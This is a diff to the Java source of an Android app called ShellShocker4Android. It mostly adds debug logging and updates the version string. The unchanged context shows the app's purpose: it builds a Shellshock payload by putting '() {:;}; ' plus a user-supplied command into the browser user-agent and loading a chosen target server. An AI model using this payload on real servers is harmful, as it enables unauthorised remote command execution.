@@ -15,7 +15,7 @@ package it.stefanobelli.shellshocker;
  * ShellShocker4Android
  *
  * Status: ALPHA
- * Version: 0.2
+ * Version: 0.2rev1
  *
  * [AndroidManifest.xml for more info(s)]
  */
@@ -69,6 +69,7 @@ public class MainActivity extends ActionBarActivity {
         settingsBrowser = webBr.getSettings();
         webBr.setWebViewClient(new WebViewClient());
         launch.setEnabled(false);
+	Log.v("onCreate", "Activity created");
 
     }
 
@@ -76,6 +77,7 @@ public class MainActivity extends ActionBarActivity {
         /**Get from edittext and convert to String */
         targetString = getTarget.getText().toString();
         commandString = getTargetCommand.getText().toString();
+	Log.v("onGetString", "I g0t Strings, need to check it");
         showConfirmTarget.setText("Server target: "+targetString);
         showConfirmCommand.setText("Command: "+commandString);
         //Check if Strings are empty or not
@@ -83,11 +85,13 @@ public class MainActivity extends ActionBarActivity {
             launch.setEnabled(true);
             getTarget.setEnabled(false);
             getTargetCommand.setEnabled(false);
+	    Log.v("onGetString", "Ready");
         } else{
             launch.setEnabled(false);
             getTarget.setEnabled(true);
             getTargetCommand.setEnabled(true);
             Toast t = Toast.makeText(this, "Check fields.", Toast.LENGTH_SHORT);
+	    Log.v("onGetString", "Check fields.");
             t.show();
         }
     }
@@ -104,6 +108,7 @@ public class MainActivity extends ActionBarActivity {
          t.show();
          settingsBrowser.setUserAgentString("() {:;}; "+commandString);
          webBr.loadUrl(targetString);
+	 Log.v("onLaunchAttack", "launched...");
     }
 
 
@@ -125,12 +130,15 @@ public class MainActivity extends ActionBarActivity {
         if (id == R.id.action_warningInfo) {
             Intent warningAboutApp = new Intent(this, WarningActivity.class);
             startActivity(warningAboutApp);
+	    Log.v("MenuListener(onOptionsItemSelected)", "action_warningInfo:launched");
             return true;
         } else if (id == R.id.action_infoDev){
             getDeveloperInfo(state);
+	    Log.v("MenuListener(onOptionsItemSelected)", "action_infoDev:launched");
             return true;
         } else if (id == R.id.action_infoAppStatus){
             getApplicationInfo(state);
+	    Log.v("MenuListener(onOptionsItemSelected", "action_infoAppStatus:launched");
             return true;
         }
 
@@ -161,7 +169,7 @@ public class MainActivity extends ActionBarActivity {
         AlertDialog.Builder builder = new AlertDialog.Builder(this);
         builder.setTitle("Open Source Software");
         builder.setMessage("This software is 'Copyleft', you can share it, redistribuide, do what you want.");
-        builder.setMessage("Open Source Hosted on: GitHub (https://github.com/StefanoBelli/shellshocker-android)");
+        builder.setMessage("Sources Hosted on: GitHub (https://github.com/StefanoBelli/shellshocker-android)");
         builder.setPositiveButton("OK", new DialogInterface.OnClickListener() {
             @Override
             public void onClick(DialogInterface dialog, int which) {
@@ -176,7 +184,7 @@ public class MainActivity extends ActionBarActivity {
     public Dialog getApplicationInfo(Bundle bundle){
         AlertDialog.Builder builder = new AlertDialog.Builder(this);
         builder.setTitle("Application Info");
-        builder.setMessage("Status: ALPHA - Version 0.2");
+        builder.setMessage("Status: ALPHA - Version 0.2rev1");
         builder.setPositiveButton("OK", new DialogInterface.OnClickListener() {
             @Override
             public void onClick(DialogInterface dialog, int which) {
